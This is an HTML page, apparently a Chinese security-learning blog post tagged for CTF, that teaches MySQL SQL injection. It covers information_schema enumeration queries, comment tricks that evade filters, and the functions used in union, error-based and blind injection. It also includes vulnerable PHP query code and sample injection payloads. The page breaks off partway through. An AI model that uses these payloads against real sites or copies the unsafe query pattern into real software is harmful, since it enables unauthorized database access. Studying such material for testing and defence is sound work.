@@ -1,0 +1,1151 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>SQL注入 - Wells's Blog</title>
+
+  
+    <meta name="description" content="SQL注入流程 找到注入点：判断是否有漏洞，寻找插入位置 构造注入语句，并在注入点注入形成新的SQL语句 新形成的SQL语句提交数据库处理 数据库执行新的SQL语句，引发注入攻击  前置知识1.特别的数据库 在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="https://wells.host/posts/e73517db/">
+<meta property="og:site_name" content="Wells&#39;s Blog">
+<meta property="og:description" content="SQL注入流程 找到注入点：判断是否有漏洞，寻找插入位置 构造注入语句，并在注入点注入形成新的SQL语句 新形成的SQL语句提交数据库处理 数据库执行新的SQL语句，引发注入攻击  前置知识1.特别的数据库 在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wells.host/img/avatar.jpg">
+<meta property="article:published_time" content="2023-11-01T16:05:19.000Z">
+<meta property="article:modified_time" content="2025-08-05T09:16:33.185Z">
+<meta property="article:author" content="Wells">
+<meta property="article:tag" content="CTF-Web">
+<meta property="article:tag" content="Web-SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wells.host/img/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF-Web,Web-SQL">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Wells's Blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/favicon.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Wells","sameAs":[],"image":"/img/avatar.jpg"},"dateCreated":"2023-11-02T00:05:19+08:00","dateModified":"2025-08-05T17:16:33+08:00","datePublished":"2023-11-02T00:05:19+08:00","description":"","headline":"SQL注入","mainEntityOfPage":{"@type":"WebPage","@id":"https://wells.host/posts/e73517db/"},"publisher":{"@type":"Organization","name":"Wells","sameAs":[],"image":"/img/avatar.jpg","logo":{"@type":"ImageObject","url":"/img/avatar.jpg"}},"url":"https://wells.host/posts/e73517db/","keywords":"CTF-Web, Web-SQL","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Wells's Blog</div><div class="sub cap">Learning Cyber Security...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 20.536C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535" opacity="0.5"/><path fill="currentColor" d="M9.5 8.75A3.25 3.25 0 1 0 12.75 12a.75.75 0 0 1 1.5 0A4.75 4.75 0 1 1 9.5 7.25a.75.75 0 0 1 0 1.5"/><path fill="currentColor" d="M17.75 12a3.25 3.25 0 0 1-3.25 3.25a.75.75 0 0 0 0 1.5A4.75 4.75 0 1 0 9.75 12a.75.75 0 0 0 1.5 0a3.25 3.25 0 0 1 6.5 0"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper markdown"><div class="widget-header dis-select"><span class="name">无限进步<<<</span></div><div class="widget-body fs14"><p>少年应有鸿鹄志，当骑骏马踏平川</p>
+</div></widget>
+
+<widget class="widget-wrapper linklist"><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="Web安全" href="/categories/web"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M3.378 5.082C3 5.62 3 7.22 3 10.417v1.574c0 5.638 4.239 8.375 6.899 9.536c.721.315 1.082.473 2.101.473c1.02 0 1.38-.158 2.101-.473C16.761 20.365 21 17.63 21 11.991v-1.574c0-3.198 0-4.797-.378-5.335c-.377-.537-1.88-1.052-4.887-2.081l-.573-.196C13.595 2.268 12.812 2 12 2s-1.595.268-3.162.805L8.265 3c-3.007 1.03-4.51 1.545-4.887 2.082" opacity="0.5"/><path fill="currentColor" fill-rule="evenodd" d="M6.688 9.8a5.75 5.75 0 1 0 10.625 4.4A5.75 5.75 0 0 0 6.688 9.8m5.256-2.032A.1.1 0 0 1 12 7.75c.004 0 .021 0 .056.018a.7.7 0 0 1 .17.134c.153.158.328.431.492.841c.162.404.296.901.39 1.466q.083.502.118 1.041h-2.452q.035-.539.118-1.04a7 7 0 0 1 .39-1.467c.164-.41.34-.683.492-.841a.7.7 0 0 1 .17-.134M9.412 9.964c-.068.415-.116.847-.14 1.286H7.816a4.25 4.25 0 0 1 2.01-2.903a9 9 0 0 0-.415 1.617M7.817 12.75H9.27c.025.439.073.871.141 1.286a9 9 0 0 0 .415 1.617a4.25 4.25 0 0 1-2.01-2.903m8.366-1.5a4.25 4.25 0 0 0-2.01-2.903c.18.486.318 1.034.415 1.617c.068.415.116.847.14 1.286zm-1.454 1.5h1.454a4.25 4.25 0 0 1-2.01 2.903c.18-.486.318-1.034.415-1.617c.068-.415.116-.847.14-1.286m-1.503 0a11 11 0 0 1-.118 1.04a7 7 0 0 1-.39 1.467c-.164.41-.34.683-.492.841a.7.7 0 0 1-.17.134a.1.1 0 0 1-.056.018c-.004 0-.021 0-.056-.018a.7.7 0 0 1-.17-.134c-.153-.158-.328-.431-.492-.841a7 7 0 0 1-.39-1.466a11 11 0 0 1-.118-1.041z" clip-rule="evenodd"/></svg><span>Web安全</span></div></a>
+<a class="link" title="渗透测试" href="/categories/penetration"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M14 21.71A7 7 0 0 1 5 15v-3.062A3.94 3.94 0 0 1 8.938 8h6.124A3.94 3.94 0 0 1 19 11.938V15a6.98 6.98 0 0 1-2 4.899"/><path fill="currentColor" d="M8.25 7.5a.75.75 0 0 0-1.5 0zm-.615-2.917a.75.75 0 1 0 1.246.834zM17.25 8.5v-1h-1.5v1zm-10.5-1v1h1.5v-1zm10.5 0c0-2.9-2.35-5.25-5.25-5.25v1.5a3.75 3.75 0 0 1 3.75 3.75zM12 2.25a5.25 5.25 0 0 0-4.365 2.333l1.246.834A3.75 3.75 0 0 1 12 3.75z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M19 14h3M5 14H2M14.5 3.5L17 2M9.5 3.5L7 2m13.5 18l-2-.8m2-11.2l-2 .8M3.5 20l2-.8M3.5 8l2 .8M12 21.5V15"/></g></svg><span>渗透测试</span></div></a>
+<a class="link" title="代码审计" href="/categories/code-audit"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path d="m17 7.83l1.697 1.526c1.542 1.389 2.313 2.083 2.313 2.974c0 .89-.771 1.585-2.314 2.973L17 16.83"/><path d="m13.987 5l-3.974 14.83" opacity="0.5"/><path d="M7 7.83L5.304 9.356C3.76 10.745 2.99 11.44 2.99 12.33s.771 1.585 2.314 2.973L7 16.83"/></g></svg><span>代码审计</span></div></a>
+<a class="link" title="电子取证" href="/categories/forensics"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M10 20h3.627a5.25 5.25 0 1 1 8.369-6.34Q22 12.9 22 12c0-.442 0-1.608-.002-2H2.002C2 10.392 2 11.558 2 12c0 3.771 0 5.657 1.172 6.828S6.229 20 10 20" opacity="0.5"/><path fill="currentColor" d="M5.25 16a.75.75 0 0 1 .75-.75h4a.75.75 0 0 1 0 1.5H6a.75.75 0 0 1-.75-.75"/><path fill="currentColor" fill-rule="evenodd" d="M17.75 14.5a2.25 2.25 0 1 0 0 4.5a2.25 2.25 0 0 0 0-4.5M14 16.75a3.75 3.75 0 1 1 6.879 2.068l.901.902a.75.75 0 1 1-1.06 1.06l-.902-.901A3.75 3.75 0 0 1 14 16.75" clip-rule="evenodd"/><path fill="currentColor" d="M9.995 4h4.01c3.781 0 5.672 0 6.846 1.116c.846.803 1.083 1.96 1.149 3.884v1H2V9c.066-1.925.303-3.08 1.149-3.884C4.323 4 6.214 4 9.995 4"/></svg><span>电子取证</span></div></a>
+<a class="link" title="工具手册" href="/categories/tools"><div class="flex"><?xml version="1.0" encoding="UTF-8"?><svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 16C44 22.6274 38.6274 28 32 28C29.9733 28 28.0639 27.4975 26.3896 26.6104L9 44L4 39L21.3896 21.6104C20.5025 19.9361 20 18.0267 20 16C20 9.37258 25.3726 4 32 4C34.0267 4 35.9361 4.50245 37.6104 5.38959L30 13L35 18L42.6104 10.3896C43.4975 12.0639 44 13.9733 44 16Z" fill="none" stroke="#333" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>工具手册</span></div></a></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/5ae37a88/"><span class="title">数据库提权中的字符集挑战</span></a><a class="item title" href="/posts/72baa392/"><span class="title">Yakit插件开发</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a><a class="item title" href="/posts/e85eefb/"><span class="title">SQL Server下SQL注入的应用</span></a><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/we11s" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="/about/#comments" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/942ebbf1a4b91.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web/">web</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-11-01T16:05:19.000Z">2023-11-02</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-08-05T09:16:33.185Z">2025-08-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>SQL注入</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a><strong>SQL注入流程</strong></h2><ol>
+<li>找到注入点：判断是否有漏洞，寻找插入位置</li>
+<li>构造注入语句，并在注入点注入形成新的SQL语句</li>
+<li>新形成的SQL语句提交数据库处理</li>
+<li>数据库执行新的SQL语句，引发注入攻击</li>
+</ol>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><strong>前置知识</strong></h2><p><strong>1.特别的数据库</strong></p>
+<p>在MySQL 5.0版本之后，MySQL默认在数据库中存放一个<code>information_schema</code>的数据库，在该库中，需要记住三个表名，分别是：<code>schemata</code>、<code>tables</code>、<code>columns</code>。</p>
+<ol>
+<li><p><code>schemata</code>表存储该用户创建的所有数据库的库名。</p>
+<p>   &gt;&gt;&gt;&gt;其中记录<strong>数据库库名的字段名为</strong>：<code>schema_name</code>。</p>
+</li>
+<li><p><code>tables</code>表存储该用户创建的所有数据库的库名和表名。</p>
+<p>  &gt;&gt;&gt;&gt;其中记录<strong>数据库库名</strong>和<strong>表名的字段名分别是</strong>：<code>tables_schema</code>和<code>table_name</code>。</p>
+</li>
+<li><p><code>columns</code>表存储该用户创建的所有数据库的库名、表名和字段名。</p>
+<p>  &gt;&gt;&gt;&gt;其中记录<strong>数据库库名、表名和字段名的字段名分别是</strong>：<code>tables_schema</code>、<code>table_name</code>和<code>column_name</code>。</p>
+</li>
+</ol>
+<p><strong>2.注释符</strong></p>
+<p>  在MySQL中，常见注释符的表达方式：</p>
+<p>​	   <strong><code>#</code> ……</strong> ：<code>#</code>号后面的都会被注释</p>
+<p>​	   <strong><code>--</code> ……</strong> ：<code>--</code>号后面的都会被注释，不过在 <code>--</code> 的前后都<strong>需要加空格</strong>再加数据(GET传参时只能使用<code>--</code>，后的<strong>空格用<code>+</code>代替</strong>)</p>
+<p>​	   <strong><code>/* ... */</code></strong> ：在查询语句中使用斜杠星号注释，从 &#x2F; 开始到 *&#x2F; 结束的部分都被视为注释，不会被执行。</p>
+<hr>
+<ul>
+<li>但**<code>/* ... */</code>** 的特殊用法-<strong>-条件注释</strong></li>
+</ul>
+<p>条件注释是一种特殊的注释语法，它允许在<strong>注释中使用关键字</strong>，而这些关键字在执行查询时会被<strong>解析为相应的操作</strong>。</p>
+<p>语法格式为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!&lt;conditional_keyword&gt; &lt;query_part&gt; */</span></span><br></pre></td></tr></table></figure>
+
+<p>   例如：<code>index?id=-10 /*!union*/ /*!select*/ 1,2,3</code>等同于<code>index?id=-10 union select 1,2,3</code></p>
+<h2 id="SQL注入常用基础语句"><a href="#SQL注入常用基础语句" class="headerlink" title="SQL注入常用基础语句"></a><strong>SQL注入常用基础语句</strong></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version(); #查看数据库版本 </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(); #查看数据库用户</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> database(); #查看当前库名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() ; #查看当前库下的表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() ; </span><br><span class="line">#只回显一行数据下查看当前库下的全部表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span>; </span><br><span class="line">#查询列名<span class="operator">-</span>把xxx缓存前面查询到的表名</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SQL注入常用函数"><a href="#SQL注入常用函数" class="headerlink" title="SQL注入常用函数"></a><strong>SQL注入常用函数</strong></h2><h3 id="联合查询-union-注入使用"><a href="#联合查询-union-注入使用" class="headerlink" title="联合查询(union)注入使用"></a>联合查询(<code>union</code>)注入使用</h3><p><strong>1.</strong><code>concat()</code>函数</p>
+<p>​	<code>concat()</code>函数：将多个<strong>不同字段</strong>的字符串连接成一个字符串。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1，str2) #语法</span><br></pre></td></tr></table></figure>
+
+<p>注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p><strong>2.</strong><code>group_concat()</code>函数</p>
+<p>​	<code>group_concat()</code> 将多个<strong>同个字段</strong>的字符串连接成一个字符串。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span>] [separator ‘分隔符’]) #语法</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入使用"><a href="#报错注入使用" class="headerlink" title="报错注入使用"></a>报错注入使用</h3><p><strong>1.</strong><code>extractvalue()</code>函数</p>
+<p>​	<em>从 MySQL 5.7.8 版本开始，<code>ExtractValue()</code> 函数已被弃用</em></p>
+<p>​	<code>ExtractValue()</code> 函数来提取 XML 字符串中的特定路径的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_string, xpath_expression)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>xml_frag：xml文档对象的名称，是一个string类型。</li>
+<li>xpath_expr：使用xpath语法格式的路径。</li>
+</ul>
+<p><strong>2.</strong><code>updataxml()</code>函数</p>
+<ul>
+<li>xml_target：xml文档对象的名称，是一个string类型。</li>
+<li>xpath_expr：使用xpath语法格式的路径。</li>
+<li>new_xml：需要更新的内容。</li>
+</ul>
+<p><strong>3.</strong><code>count()+rand()+floor()+group by()</code>函数</p>
+<p><code>rand()</code>函数：rand()返回0到1的随机数。rand(0)返回一个固定的0到1的伪随机数。</p>
+<p><code>floor()</code>函数：<code>floor(x)</code>返回小于或等于 x 的最大整数。</p>
+<p><code>group by</code>语句：<code>group by</code>语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p>
+<h3 id="布尔盲注使用"><a href="#布尔盲注使用" class="headerlink" title="布尔盲注使用"></a>布尔盲注使用</h3><p><strong>1.</strong><code>substr()/substring()</code>函数</p>
+<p>​	<code>substr()/substring()</code>函数：用来截取数据库某个字段中的一部分。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string，<span class="keyword">start</span>开始位置，length截取长度)  #语法</span><br></pre></td></tr></table></figure>
+
+<p>参数</p>
+<ul>
+<li>string：必选，数据库中需要截取的字段</li>
+<li>start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。</li>
+<li>length：可选，需要截取的长度。缺省。即截取到结束位置</li>
+</ul>
+<p><strong>2.</strong><code>ascii()</code>函数</p>
+<p>​	<code>ascii()</code>函数：返回字符串str的最左边的数值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(str)  #语法</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.</strong><code>length()</code> 函数，返回字符串的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str) #语法</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="注入点分类"><a href="#注入点分类" class="headerlink" title="注入点分类"></a><strong>注入点分类</strong></h2><h3 id="①数字型注入点"><a href="#①数字型注入点" class="headerlink" title="①数字型注入点"></a><strong>①数字型注入点</strong></h3><p><strong>类似的后端语句</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+
+<p> 在 Web 端大概是 <code>http://xxx.com/index.php?id=1</code> 这种形式，其<strong>注入点 id 类型为数字</strong>，所以叫数字型注入点。</p>
+<p>用<code>1 and 1=1</code>进行组合出来的sql注入语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=1 and 1=1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="②字符型注入点"><a href="#②字符型注入点" class="headerlink" title="②字符型注入点"></a>②字符型注入点</h3><p><strong>类似的后端语句</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+
+<p> 在 Web 端大概是 <code>http://xxx.com/index.php?id=admin</code> 这种形式，其<strong>注入点id 类型为字符类型</strong>，所以叫字符型注入点。</p>
+<p>使用<code>id=1&#39; and 1=1 --+</code>组合出来的sql注入语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+&#x27; LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p> <strong>注意多了一个引号</strong>。由于注入拼接语句后多了一个<code>&#39;</code>,<strong>需要用注释符进行消除对语句的影响</strong></p>
+<h3 id="③搜索型注入点"><a href="#③搜索型注入点" class="headerlink" title="③搜索型注入点"></a>③搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：</p>
